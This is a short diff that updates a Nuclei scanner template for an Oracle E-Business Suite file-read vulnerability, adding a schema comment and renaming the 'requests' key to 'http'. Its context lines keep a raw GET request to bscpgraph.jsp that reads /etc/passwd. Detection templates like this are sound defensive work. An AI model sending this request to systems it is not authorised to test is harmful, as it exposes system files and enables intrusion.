@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: oracle-ebs-bispgrapgh-file-read2
 
 info:
@@ -11,7 +12,7 @@ info:
     - http://www.davidlitchfield.com/AssessingOraclee-BusinessSuite11i.pdf
 
 
-requests:
+http:
   - raw:
       - |
         GET /OA_HTML/jsp/bsc/bscpgraph.jsp?ifl=/etc/&ifn=passwd HTTP/1.1
